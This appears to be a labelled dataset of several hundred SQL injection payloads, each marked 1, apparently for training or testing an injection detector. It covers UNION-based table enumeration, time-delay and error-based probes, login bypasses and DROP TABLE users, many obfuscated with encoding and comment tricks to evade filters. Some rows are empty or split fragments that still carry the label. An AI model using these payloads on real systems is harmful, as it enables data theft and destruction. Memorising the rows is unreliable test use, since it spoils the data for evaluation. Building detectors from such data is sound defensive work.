"'UNION%0d%0aSELECT%0a1,2,3--%0a", 1
"%25u0027%25u0020OR%25u00201%3D1%25u0020%25u0020OR%25u0020%25u0027b%25u0027%3D%25u0027b%25u0027--%25u0020", 1
"%2527%2520OR%2520%25271%2527%253D%25271", 1
"test'O/**/%52/*%0%64%0a*/'1'%3d'1'--/*%0a%2a/", 1
"TESt' || (1=1)'1'='1' /*", 1
"' and 1=cOnveRt(inT,@@vERsIOn)--", 1
"'/*!*/     AND      1 =  %63onvert%28in%74,@@versi%6fn)-%2d", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29--#2aqbob9", 1
"%27 AND 1=convert(%69nt,@@version)%2d%2d", 1
"%u0027/**/OR/**/1=1/**/--/**/", 1
"test%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020--%25u0020--7b8lpabb4t7lskp", 1
"'%20A/**/ND/**/1LIKEconve%72t(%69nt,@@version%29--", 1
"%3b%20SEleCT%20%50g_sL%65e%50%28%35%29%3b%20 AND 'a'='a'--", 1
"test'     XOR     '1' =	'1'     --", 1
"%27 UNION S%45LECT null, null, null%20--%20", 1
"'/**/AND/**/1>=1/**/--/**/", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables  AND 'a'='a'--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----x7dvjppt33v", 1
"1' UNION%20SELECT ta%62le_name,%20nul%6c%2c null%20FROM infor%6dat%69on_schema.tables --", 1
"; SELECT pg_sleep(5);  XOR 'a'='a'----d2igafdj3gyx92e", 1
"1AND/*%0a*/1=1/*%0d%0a*/", 1
"'/*!*/UNION SELECT null, null, null -- #7llze", 1
"'/**/OR/**/1>=1/**/--/**/", 1
"test'/*!12345*/         OR          '1'  =%20'1'          --", 1
"1)/**/uN/*!*/Ion/**/seLecT/**/1,DaTabASE(),3----ukt4GYvHj1l", 1
"%27%20OR%20ExIsTs(sELECT%201%20FroM%20uSErs)--", 1
"test%27%20OR%20%271%2527%253d%271%2527%20--%20%23lx87lxm", 1
";/*!12345*/DROP%20TABLE%20us%65rs%3b%2%30%20OR%%320%281)--", 1
"WAITFOR/*!*/DELAY '0:0:5' /*!*/AND 1IN (1)1--", 1
"te%73t'%20OR/**/'1'=%271'/**//*/**/OR/**/(1)", 1
"1)%20UnIOn%20SelECT%201,DATaBaSE(),3%20#%20more_noise--", 1
"' UNION SELECT null, null, null -- #fo8g7dul", 1
"'/**/X%4fR/**/1=1%2f**/--/*%2a/", 1
"%u0027/*!*/oR%u00201=1%u0020--%u0020", 1
"'OR%0d%0aEXISTS(SELECT1FROMusers)#more_noise--", 1
"%27%2520OR%25201%20%20%3D%091%2520--%2520%23W759kV", 1
"test%27%2F%2A%21%2A%2FXOR%20%271%27%3D%271%27%20%2F%2A", 1
"adm%2569%256e%27%20OR%20%271%27%3D%271", 1
"%3bseL%2f%2a%2a%2fECt%2f%2a%250D%250a%2a%2fPG_SlEep%285%29%3b--", 1
"1' && substring(database(), 1, 1) = 's' --", 1
"1%20anD%2%301%3%441", 1
"wAItFor%20DelAY%20%270:0:5%27%20OR%20%27b%27%3D%27b%27----oi1ypye4epq7a6e", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#yrga3mm6q4pugor", 1
"'%09%09%09%09AND%09%09%09%09extractvalue(1,concat(0x5c,version()))--", 1
"ADmIN%U0027%U0020OR%u0020%u00271%u0027%09= %u00271", 1
"test%u0027/**/OR/**/%u00271%u0027	=%20%u00271%u0027/**//*", 1
"1%27%20O/*!12345*/R%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"1%27%09%09%09%09%09O%2F%2A%2A%2FR%09%09%09%09%09ascii%28substring%28database%28%29%2C%09%09%09%09%091%2C%09%09%09%09%091%29%29%09%09%09%09%09%3E%09%09%09%09%09100%09%09%09%09%09--", 1
"'OREXISTS(SELECT1%0d%0aFROM/*%0a*/users)--", 1
"%27%20AN%44%201%3D1%2%30--%20", 1
"test%27/**/OR/**/%271%27IN%20(1)%271%27/**//*--ia15fn9x4pu", 1
"admin%27%20O/*!12345*/R%20%271%27%3D%271 # more_noise", 1
"test%u0027%u0020O/*!*/R%u0020%u00271%u0027=%271%u0027%u0020/%2a", 1
"test'OR'1'='1'%0a--/*%0a*//*%0a*/", 1
"' OR '1'='1 OR (1)", 1
"admin%25u0027%25u0020O/**/R%25u0020%25u00271%25u0027%3D%25u00271", 1
"test%u0027%u0020O/*!12345*/R%u0020%u00271%u0027=%u00271%u0027%u0020/*", 1
"1'/*!*/OR", 1
"ascii(substring(database(),1,1))>100/*%0a*/--", 1
"test'%09%09OR%09%09'1'%09=	'1'%09%09--%09%09", 1
"' aNd 1=1 --", 1
"'/**/AND/**/1=convert(int,@@version)/**/AND/**/'a'='a'--", 1
"'/**/OR/**/%45X%49STS(SELECT%201/**/FROM/**/use%72s)--", 1
"1%%320AND%%3201%3D1", 1
"1))%20UNION%20S%45%4cECT%201,databas%65()%2c3--#87e781", 1
"test'O%52/*%0d%0a*/'1%27='1'/*%0d%0a*/-%2d#5elvgdbw9/*%0a*/", 1
"%u0027%u0020&&%u0020(1=1)extractvalue(1,concat(0x5c,version())) -- random_noise--#99vdp0xl", 1
"1%20%20%20%20A/*!12345*/ND%20%20%20%201%20%20%3D%201", 1
"1%U0027%u0020oR%u0020AsCIi(SubstRing(dataBaSE(),%u00201,%U00201))%u0020>%U0020100%U0020--", 1
"%31'%20UNiON %53ElEC%74 table_NAmE, nULl, Null FRoM IN%66%4fr%4dATion_scheMa.TABl%65s --#jt7s10%34v48gsai", 1
"' %20%55NI%4fN  SELECT  1,2,3--#l%33s7vrv8", 1
"test'/**/OR/**/'1'	=  '1'/**//*#Xhc63ZuTQB", 1
"1%20%26%26%201%3D1%20%23%20more_noise", 1
"1'/*!*/AND substring(database(), 1, 1) <= 's'  -- random_noise--", 1
"AdMIn'/*!12345*/OR '1'='1 oR 'B'='B'", 1
"1%20%20%20AND%20%20%201	=%201 || (1=1)(1)", 1
"1'%20%20uNioN%20%20SeLect%20%20TaBLE_NAme,%20%20NuLL,%20%20NUll%20%20From%20%20inFOrMATIoN_schEMa.tABleS%20%20--#qf63bdu1g5g", 1
"%u0027/**/OR/**/%u00271%u0027=%u00271 /*!*/AND 1=1", 1
"' anD 1=ConVERt(iNT,@@VErSioN)--", 1
"admin'/**/OR/**/'1'LIKE'1", 1
"%27/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users) # more_noise--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#x4a9oawe4q9", 1
"1%27ANDsubstring%28database%28%29%2C1%2C1%29%2F%2A%250d%250a%2A%2F%3D%27s%27%20OR%20%27b%27%3D%27b%27--", 1
"1%27/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/%3E/**/100/**/--", 1
"'%20A%4ed 1=%31 -- --uq1p2snlromzew%76", 1
"1 && 1>=1#kede6tc1gn9", 1
"1)uNIonSElecT", 1
"1,DatABaSe(),3--", 1
"WAIT%46OR DELA%59 '0:0:5'%2d-", 1
"1'     Xor     if(suBsTRIng(DataBaSE(),     1,     1)	= 'A',     SlEeP(5),     0)     --", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020----rtjhk0qccu4", 1
"%27%20uNiON%20selecT%20nUll%2C%20Null%2C%20Null%20--%20", 1
"%3B%20DROP%20TABLE%20%75sers%3B%2%30%20%4fR%20%281%2%39--", 1
";%20S%45LECT%%320pg_sleep(5%29;%20--", 1
"1'uNioNSelECTtAbLE_NAMe,", 1
"NUll,nULLFroM%0d%0AiNforMAtioN_SCHeMa.tABLes # MORe_nOIsE--", 1
"test' OR '1'='1' -- --m6woh67u6gj", 1
"test'%20%20%20OR%20%20%20'1'LIKE'1'%20%20%20/*", 1
"%u0027				||				(1	=%201)EXISTS(SEL/**/ECT				1				FROM				users)--", 1
"admin'/**/Or/**/'1'='1--utbeeh7fpmo", 1
"%u0027/**/%u0020%u0020%u0020%u0020%u0020%u0020%u0020&&%u0020(1=1)%u0020%u0020%u0020%u0020%u0020%u0020%u00201%u0020%u0020=%20convert(int,@@version)--", 1
"'/**/anD/**/1=1/**/ AND 'a'='a'--/**/", 1
"'  AND  1  >=%09convert(int,@@version)--", 1
"'        AND        1  =  1        --", 1
"' oR '1'='1", 1
"1%27%20OR/**/IF(su%62string(dat%61base(),/**/1,/**/1%29%3D%27%61%27,/**/SLEEP(5),/**/0%29/**/----016kcupltvswhy", 1
"'/**/OR/**/EXISTS(SEL/*!12345*/ECT/**/1/**/FROM/**/users)--", 1
"%27%20UN/*!*/ION%20SELECT%20null%2C%20null%2C%20null%20--%20", 1
"%27%20%20%20%20%20UNION%20SELECT%20%20%20%20%20null,%20%20%20%20%20null,%20nul%6c%20%20%20%20%20--%20", 1
"'AND1%09=  convert(int,@@version)--%0a", 1
"'/*!*/OR'%31'%3d'1%0d%0a", 1
"; SELeCT PG_SlEEp(5); --", 1
"1%u0020AND%u00201 = 1%u0020#%u0020more_noise", 1
"'  XOR  EXISTS(SELECT  1  FROM  users)--", 1
"1%27%20AnD%20SuBSTRInG%28dataBaSE%28%29%2C%201%2C%201%29%20%3d%20%27S%27%20--", 1
"%27%2F%2A%2A%2F%7C%7C%20%271%27%3D%271%20OR%20%281%29", 1
"'%20%20%20%20OR%20%20%20%201  =%091%20%20%20%20--%20%20%20%20", 1
"%27%20AND%201%3Dconvert(int,@@version)%20OR%20%27b%27%3D%27b%27--", 1
"%u0027/*!12345*/UN%49O%4e%u0020SELE%43T%u0020null,%u0020null,%u0020%6eull%u0020--%u0020", 1
"1'/**/&&/**/substring(database(),/**/1,/**/1)/**/	= /**/'s'/**/%20%20%20#%20%20%20more_noise--", 1
"%U0027%u0020unio%4e%u0020selE%43%54%U0020nulL,%U0020null,%u0020nu%6CL%u0020--%u0020", 1
"' and 1=conVerT(iNt,@@verSiOn)--", 1
"%27%20%20%20anD%20%20%201 =	coNv%65%72T(InT,%40@VErSIOn)%20%20%20/*!*/AND%20%20%201 =	1--", 1
"1))/**/UNION%u0020SELECT%u00201,database(),3--", 1
"1%u0027%u00%320%u0020%u0020%u002%30or%u0020%u0020%u0020%u0020iF(S%75BStRiNg(d%61T%41bAse(),%u0020%u002%30%u0020%%75002%301,%u0020%u%300%320%u0020%u00201)%u0020%3d%u0%3020%%75002%37%41%u0027,%u0020%u0020%u0%3020%u0020slEeP(5),%u0%3020%u0020%u0020%u00200)%%7500%320%u0020%%750020%%750020%2d-", 1
"' XOR 1=1 -- --h4j8i", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users) OR 'b'='b'--#1u6p6", 1
"' UNION SELECT 1,2,3----guny1apmlksmjx0", 1
"'OR%0d%0a1=1/*%0a*/--", 1
"", 1
"%27OR1%3D1--/*%0a*/--mrfcz7wv0pnzbl", 1
"1)) UNION SELECT 1,database(),3--#els1n4i0krtzcx3", 1
"1' || (1=1)IF(substring(database(), 1, 1)='a', SLEEP(5), 0) ----g0xlnzly", 1
"teSt'OR'1'='1'OR%0d%0a'b'='b'--", 1
"", 1
";/*!12345*/DROP %54ABLE use%72s%3b --", 1
"1aND/*%0A*/1=1", 1
"", 1
"test%27 OR '1'L%49KE'1' /*%20# more%5fnoise", 1
"'/*!12345*/aNd exTRaCtvalue(1,COncAt(0X5c,vERsiON())) /*!*/ANd 1=1--", 1
"1AND1>=1/*%0a*/", 1
"1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F%20OR%20%27b%27%3D%27b%27----5fgta7wm9u", 1
"1%27/**/AND/**/substring(database(),/**/1,/**/1)/**/%3D/**/%27s%27/**/--", 1
"1 AND 1=1#zuwbhjsoo23mr", 1
"'/**/unIOn/**/sELEct/**/nuLL,/**/NuLl,/**/nUlL/**//**/#/**/more_noise--/**/", 1
"'%20OR E%58ISTS(SELECT 1 FROM%20users%29--", 1
"t%65%73t%u002%37%u0020OR%u0020%u00%3271%u002%37IN%u0020(1)%u00271%u0027%%750020--%u002%30", 1
"%27%20%20%20%20OR%20%20%20%201%20%3D%201%20%20%20%20--%20%20%20%20", 1
"' %41ND 1=convert(int,@@ve%72s%69%6fn) A%4eD 'a'='a'--", 1
"'  OR  '1'%20= '1  OR  (1)", 1
"' AND 1=convert(int,@@version) OR 'b'='b'--", 1
"1'  OR  I%46(substri%6eg(%64atab%61se(),  1,  1)%20=	'%61',  S%4cEEP(5%29,  0)   /*!*/AND 1=1--#4z5ehq", 1
"; SE%4c%45CT pg_%73leep(5%29;  -- random_n%6fise--#%358y9hzjb32rjfg", 1
"1%27%20Or%20aScii(SubStrinG(dAtaBAsE(),%201,%201))%20%3e%20100%20--", 1
"' AND %31=c%6fnv%65rt(int,@%40version)--", 1
"'/**/OR '1'<='1", 1
"1%U0027/*!*/OR%u0020aSCII(SuBstRinG(datAbaSE(),%U00201,%u00201))%u0020%3E%u0020100%U0020--", 1
"test' OR '1'IN (1)'1' /* /*!*/AND 1=1", 1
"'%20AND%20extractvalue(1,concat(0x5c,version()))--", 1
"1'   ||   asc%69i(substri%6e%67(data%62ase(),   1,%201))   >   100   --", 1
";/*!12345*/DROP TABLE users;  # more_noise--", 1
"'OR%0a'1'='1", 1
";%u0020sELeCt%u0020pg_SLeEP(5);%u0020--", 1
"'%09%09OR%09%09EXISTS(SELECT%09%091%09%09FROM%09%09users)--", 1
"1%09%09%09%09%09AND%09%09%09%09%091IN%09%09%09%09%09(1)1%09%09%09%09%09AND%09%09%09%09%09'a' =%20'a'", 1
"%27%2F%2A%21%2A%2FAND%201%3Dconvert%28int%2C%40%40version%29--", 1
"test'        OR        '1'%09=	'1'        --", 1
"1%27/*!*/Or%20If(suBStRIng(daTaBaSE(),%201,%201)%3D%27a%27,%20sLEEP(5),%200)%20--", 1
"1)%20UniOn%20SeLecT%201,dAtAbAse(),3--", 1
"1' XOr iF(SUbstrinG(datAbasE(), 1, 1)='a', sLEEP(5), 0) --", 1
"1'/**/ORa%73cii(sub%73tr%69%6eg(database(),/*%0d%0a*/1,%201))%0a>/*%0a*/100%20--", 1
"1'/*!*/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/--", 1
"1))/**/UNION SELECT 1,database(),3--", 1
"WAITFOR/**/DELAY/**/'0:0:5'/**//*!*/AND/**/1=1--", 1
"'/**/OR '1'='1 AND 'a'='a'", 1
"1%2527%2520%7C%7C%2520ascii%28substring%28database%28%29%2C%25201%2C%25201%29%29%2520%253E%2520100%2520--", 1
"1))UNIONSELECT", 1
"1,database(),3--", 1
"1/%2a!12345*/AND%31%3D1%0a", 1
"1%2520%2520%2520%2520AND%2520%2520%2520%25201%20%3D%091", 1
"%U0027/*!*/or%u00201	=%201%u0020--%U0020", 1
"1' || ascii(substring(database(), 1, 1)) > 100 --", 1
"WAITFORDELAY", 1
"%270:0:5%27--/*%0a*/", 1
"WAITFOR DELAY '0:0:5'----ghmu7ir", 1
"'UNION%0aSELECTnull,null,null--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--#5qs3zuu", 1
"1%u0027%u0020A/*!*/ND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--#nm7tk2t82s9sk", 1
"test%27%20O/*!*/R%20%25271%27%3D%2527%2531%27%20--%20", 1
";selecTpg_SLeEP(5); # more_noise--", 1
"", 1
"%u0027/*!*/UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020--%u0020", 1
"1%27%2F%2A%2A%2FAND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"; SELECT pg_sleep(5); ----0419yfpszh8ub", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20 -- random_noise--", 1
"1'UnionSElecTtABLE_namE,NULl,NUllfrom%0aINFOrMATIoN_scHEMA.TAblES--raNDOM_nOIse--", 1
"'/*!12345*/AND 1>=convert(int,@@version)--", 1
"%%327%20UNI%4fN%2%30SELECT%20null,%20null%2c%20nu%6cl%20-%2d%20#vjowbejsatx", 1
"1)) UNION SELECT 1,database(),3--#x18wxqoxm", 1
"1' unioN sELEcT taBlE_nAmE, Null, NULl FROm iNfORMation_scHeMA.tAblES --", 1
"admin%27OR%2F%2A%250a%2A%2F%271%27%09%3D%20%20%271%250d%250a", 1
"'/**/unIon/**/SELecT/**/1,2,3--", 1
"' AND extractvalue(1,concat(0x5c,version()))--#sk4hx9p", 1
"WaITfOrDelAy/*%0D%0a*/%270:0:5%27--", 1
"", 1
"%27unIOnsElECT%250a1%2C2%2C3--%2F%2A%250a%2A%2F", 1
"admin%27/**/OR/**/%271%27%20%3D%20%271", 1
"1AND1  =%201/*%0d%0a*/", 1
"teST%27%20oR%20%271%27%3D%271%27%20%2F%2A /*!*/and 1=1", 1
"%27%09%09%09AND%09%09%091%09%3D%20%201%09%09%09%20OR%20%27b%27%3D%27b%27--%09%09%09", 1
"1'%09%09%09%09OR%09%09%09%09IF(substring(database(),%09%09%09%091,%09%09%09%091)%09=%09'a',%09%09%09%09SLEEP(5),%09%09%09%090)%09%09%09%09--", 1
"test' XOR '1'='1' --", 1
"1'		UNION		SELECT		table_name,		null,		null		FROM		information_schema.tables		--", 1
"test%25u0027%25u0020O%2F%2A%21%2A%2FR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020--%25u0020", 1
"1'ORascii(substring(database(),/*%0a*/1,", 1
"1))%0d%0a>100--", 1
"1%27%09%09OR%09%09IF(substring(database(),%09%091,%09%091)%20%20%3D	%27a%27,%09%09SLEEP(5),%09%090)%09%09--", 1
"' uNioN SeLECT NulL, NUlL, nULl  || 'b'='B'-- #bwg39n", 1
"'/**/AND/**/1=1/**//**/#/**/more_noise--/**/", 1
"1)UnION", 1
"SElect%0A1,daTabAsE(),3--%0D%0a", 1
"%27%20and%201%3DcoNVerT(INT,@@VerSioN)--", 1
"test'      OR      '1'%09=%09'1'      --      #beu3k3e8utjs4pa", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20 OR (1)--", 1
"1/**/And/**/1=1", 1
"1'%09%09%09%09%09OR%09%09%09%09%09IF(substring(database(),%09%09%09%09%091,%09%09%09%09%091)%09=  'a',%09%09%09%09%09SLEEP(5),%09%09%09%09%090)%09%09%09%09%09--", 1
"wAItfOr DElay '0:0:5'--#31QEi", 1
"1'%20%41%4eD substr%69ng(database(%29, 1, 1) = 's' --", 1
"%u0027				XOR				1	=%20convert(int,@@version)--", 1
"'/**/       uNion        SeLecT        1,2,3--", 1
"%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0020AND%u0020%u0027a%u0027=%u0027a%u0027--hl5tbpuz1", 1
"1))%20uNIOn%20SelECT%201,dATabASe(),3%20xoR%20%27A%27%3D%27A%27--", 1
"1 AND 1=1--yos5qm5ee", 1
"%u0027%u0020Or%u00201=1%u0020--%u0020", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables ----5fdyk0e", 1
"test'/**/OR/**/'1'='1'/**//* OR (1)--408m099oj2eyc", 1
"'/*!12345*/oR 1=1 --", 1
"'	OR	'1' =	'1", 1
"1'AND%0asubstring(database(),1,/*%0d%0a*/1)/*%0d%0a*/='s'--", 1
"%31%27/*!12%3345*/UNION%20%53ELECT%20table_name,%20null,%20null%20FROM%20infor%6da%74ion_sc%68ema.t%61%62%6ces%20--", 1
"1%u0027			UNION			SELECT			table_name,			null,			null			FROM			information_schema.tables			--", 1
";%20SELECT%20pg_sleep(5);%20 # more_noise--", 1
"test%27%20OR%20%271%27%3D%271%27%20%09%09%09--%09%09%09random_noise--%20", 1
"1' X%4fR ascii(%73ubstr%69ng(databa%73e(), 1, 1)) %3e%20100 --", 1
"; dROp tablE UsErS;  OR (1)----v99n0v7lF", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)LIKE%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--", 1
";/**/DROP/**/TABLE/**/users;/**//**/OR/**/'b'='b'--#hzam9uoubwi3", 1
"test'/%2a!*/OR '1'='1%27 %2d- --5mzmhunksuthp94", 1
"'and1=1", 1
"--%0a/*%0d%0a*/", 1
"1' OR I%46(subst%72ing(database(), 1%2c 1)='a%27%2c SLEEP(5), 0)%20--", 1
"'/**/OR/**/'1'  >=	'1", 1
"1'ANDsubstring(database(),%0d%0a1,1)IN/*%0d%0a*/(1)'s'----bbveebi6y9", 1
"test%27%20%20%20OR%20%20%20%271%27%20%20%3D%20%271%27%20%20%20--%20%20%20", 1
"WAITFO/*!*/R%20DELAY%20%270:0:5%27--", 1
";SELECTpg_sleep(5);%0d%0aOR/*%0d%0a*/(1)--%0a#48owqeox5", 1
"' UNION SELECT null, null, null -- --3jjq0h6wbmlg", 1
"1'/**/and sUBstring(DaTAbAse(), 1, 1) = 'S' --", 1
"'/**//**/Or/**//**/ExiStS(SelECT/**//**/1/**//**/FROM/**//**/USerS)--#81Y7XyX66", 1
"' %41ND 1=%31 --", 1
"WAITFO/*!12345*/R%20DELAY%20%270%3A0%3A5%27 AND 'a'='a'--", 1
";    DROP    %54ABLE    users%3b    ----%62x68jou%6dzzwz4", 1
"%3B%2F%2A%2A%2FSELECT%2520pg_sleep%28%2535%29%3B%2F%2A%2A%2F-%252d", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --#k0khhlef", 1
"' %41ND %31=conver%74(i%6et,@@version)--", 1
"1%27/**/UN/*!*/ION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/--", 1
"test'/**/OR/**/'1'<='1'/**/--/**/#vllfz2sv", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020----gvu1s2tapl39gh", 1
"1%27/**//**//**//**/OR/**//**//**//**/ascii(substring(database(),/**//**//**//**/1,/**//**//**//**/1))/**//**//**//**/%3E/**//**//**//**/100/**//**//**//**/ OR 'b'='b'--", 1
"'/**/or/**/1<=1/**/--/**/", 1
"%u0027%u0020unI%4fN%u0020SeL%45Ct%u0020nUlL%2c%u0020NuL%4c,%u0020nuLl%u0020--%u0020", 1
"; DROP TA%42%4c%45 users; --", 1
"test' XO%52 '1'=%271'%20/*", 1
"' AN%44 1=1 -%2d  AND 'a'='a'", 1
"1'/*!*/OR IF(substring(database(), 1, 1)>='a', SLEEP(5), 0) ----2o3sc2xlqntv", 1
"test'%20OR'1'%3d'1'-%2d/*%0d%0a*/#ps5k4", 1
";DROPTABLEusers;--%0d%0a", 1
"1%27%2F%2A%2112345%2A%2FANd%20SubStRINg%28datABAsE%28%29%2C%201%2C%201%29%20%3D%20%27S%27%20----bjiqowrv", 1
"%57aitfOr/*!12345*/%44Elay '%30:0:5' and 'a'='A'--", 1
"1)/**//**//**//**/UNION/**//**//%2a%2a//%2a%2a/SELECT/**//**%2f/**//*%2a%2f1,database%28),3--", 1
"%u0027%u0020AN%44%u0%30201	=  conv%65rt%28int,@@version%29--", 1
"%27%20uNIon%20select%20Null,%20nuLL,%20nULL%20--%20", 1
"test%u0027/*!12345*/OR%u0020%u00271%u0027=%u00271%u0027%u0020/*", 1
"; DROP T%41BL%45 use%72s; --", 1
"%u0027%u0020OR%u0020%u00271%u0027=%u00271%u0020/*!*/AND%u00201=1", 1
"test%27%20O%2552%20%25271%27%3D%271%27%20%2F%2A", 1
"' UNION SELE%43T n%75ll, null, %6e%75ll --", 1
"1%u0027%u0020||%u0020(1=1)Ascii(sUBsTrIng(dATAbAsE(),%u00201,%u00201))%u0020>%u0020100%u0020----giz34yjtlrjkm", 1
"1%29)%u%30020uNioN%U0020S%45lEcT%U00201,DaTaBaS%65(),%33--", 1
"1/**/AND/**/1=1 # more_noise", 1
"1%27%20A/*!*/ND%20substring(database(),%201,%201)%20%3D%20%27s%27%20----hlaeqx6z", 1
"'%2f**/OR %271'<='1", 1
"WAITFOR/**/DELAY'0:0:5'--%0a", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020----yvsen", 1
"' aNd 1IN (1)CoNVErt(iNt,@@veRSiOn)--", 1
"WAITF%4fR/**/%44ELAY/**/%u00270%3a0:5%u0027%u0020--%u0020random_noise--", 1
"1AnD/*%0a*/1=1--xsbin8", 1
"admin'OR/*%0d%0a*/'1'< = '1%0a", 1
"tesT%27%20||%20(1%3D1)%271%27%3D%271%27%20--%20", 1
"wAITfOrdELaY/*%0d%0a*/'0:0:5'--%0d%0a", 1
"1' && substring(database(), 1, 1) = 's'  /*!*/AND 1=1--", 1
"%27%20OR%20%271%27%3D%271%20--%20random_noise", 1
"1%29%2F%2A%21%2A%%32FUNION%20SELE%43T%201%2Cdat%61ba%73e%28%29%2C3%2d-", 1
"'%20AND%201  =%091%20--%20", 1
"' %41ND extr%61ctvalue(1%2cconca%74(0x5c,ver%73ion()))--", 1
"1%u0027/**/OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020>%u0020100%u0020 OR (1)--", 1
"admin'OR/*%0a*/'1'='1/*%0d%0a*/", 1
"%27%20AN%44%201%3C%3D1%20-%2d%20", 1
"1)%u0020UN/*!12345*/ION%u0020SELECT%u00201,database(),3--", 1
"'/**/OR 1LIKE1 --", 1
"1' Or if(sUbsTRiNg(dATabaSe(), 1, 1)='a', sLEeP(5), 0)  Or 'B'='b'--", 1
"1'/**/UNIONSELECTtable_name,null,nullFROM/*%0d%0a*/information_schema.tables--", 1
"%u0027%u0020UNI%4fN%u0020%53ELE%43T%u00201,2,3--", 1
"test%u0027/*!*/XOR%u0020%u00271%u0027=%u0027%31%u0027%20/*", 1
"1%U0027	oR	IF(SubStrinG(dAtAbaSe(),	1,	1)%20=%09%u0027A%U0027,	SLEEp(5),	0)	--", 1
"1%u0027/**/OR/**/IF(substring(database(),/**/1,/**/1)	=	%u0027a%u0027,/**/SLEEP(5),/**/0)/**/--", 1
"1)UNION%0aSELECT/*%0a*/1,database(),3--/*%0a*/", 1
"' UNION SELECT null, null, null  /*!*/AND 1=1--", 1
"aDmiN'/**/or '1'='1", 1
"test%27%20OR '1'LIKE'1' /*", 1
"1)%29 UNION S%45LECT 1,databas%65(),3%2d-", 1
"test%u0027%u0020OR%u0020%u00271%u0027%20=	%u00271%u0027%u0020--%u0020", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29LIKE%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"admin%u0027%u0020O/*!12345*/R%u0020%u00271%u0027<=%u00271", 1
"' UNION SELECT 1,2,3 AND 'a'='a'--", 1
"'/*!*/OR EXISTS(SELECT 1 FROM users)----7zzohjdx", 1
"1 XOR 1=1--rsjnjg", 1
"' OR %45XIS%54S(SELECT%201 FRO%4d users) # more_noise--#pa8n2", 1
"' UNION SELECT null, null, null -- #tg96ea1", 1
"'OREX%49STS(SELECT1FRO%4dusers)--/%2a%0a*%2f", 1
"' OR 1<=1  OR 'b'='b'--", 1
"'UNION", 1
"SELECT%0a1,2,3--%0a", 1
"%u002%37%u0020A%4eD%u00201%3d1%u00%320 -- random_noise%2d-%u0020", 1
"%27%%320UN/*!12345*%2f%49ON%20%53ELECT%20null%2C%20null%2C%%320%6eull%20--%20", 1
"1%20aND%201LiKe1", 1
"1%2527UNIONSELECTtable_name%2Cnull%2CnullFROMinformation_schema.tables%2F%2A%250a%2A%2F%20%23%20more_noise--", 1
"1)UNION%0aSELECT/*%0d%0a*/1,database(),3--/*%0d%0a*/", 1
"1%27%20XOR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"admin%u0027%u0020O/*!*/R%u0020%u00271%u0027=%u00271", 1
"1' UNION SELECT%20table_%6eame, nul%6c, n%75ll FROM inform%61ti%6fn%5fschema.tables%20--", 1
"1))/%2a*/%55NIO%4eSELECT%0a%31,database(),3--%0d%0a", 1
"%27%20UniOn%20SElEcT%20nULl,%20nulL,%20nULl%20--%20#rgiuaay", 1
"1 AND 1<=1--mb7py0lm7cdf1", 1
"%2%37%20OR%20%271%%327%3D%271--sl%39hbcdux", 1
"%U0027%U0020anD%u00201=1%u0020--%U0020", 1
"%25u0027%25u0020UNION%25u0020SELECT%25u00201%2C2%2C3--", 1
"'%20%20%20OR%20%20%201  =%201%20%20%20--%20%20%20", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)%20=/*!*/%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020 OR (1)--", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20 AND 'a'='a'--", 1
"%u0027%u00%320%55NION%u0020%53ELECT%u002%301,2,3--", 1
"1' AND substring(database(), 1, 1) = 's' ----nj0ov4x", 1
"' AND 1  =%091 --", 1
"%27%20OR%20%271%27%3D%271%20--%20random_noise%23i0w1bw60PwKv", 1
"1%29%29%20UNioN%20SeLeCt%201%2CDatABAsE%28%29%2C3--", 1
"tESt%27%20oR%20%271%27%3D%271%27%20%2f%2A", 1
"1%u0020AND%u00201=1 -- random_noise--yo4pxmw3b", 1
"%27%20AND%20e%78tract%76alue(1,concat(%30%785c,version()))%2d-", 1
"%u0027%u0020%u0020%u0020%u0020AND%u0020%u0020%u0020%u0020extractvalue(1,concat(0x5c,version()))----3nyj5gouwbcs", 1
"%25u0027%25u0020UN/**/ION%25u0020SELECT%25u0020null%2C%25u0020null%2C%25u0020null%25u0020--%25u0020", 1
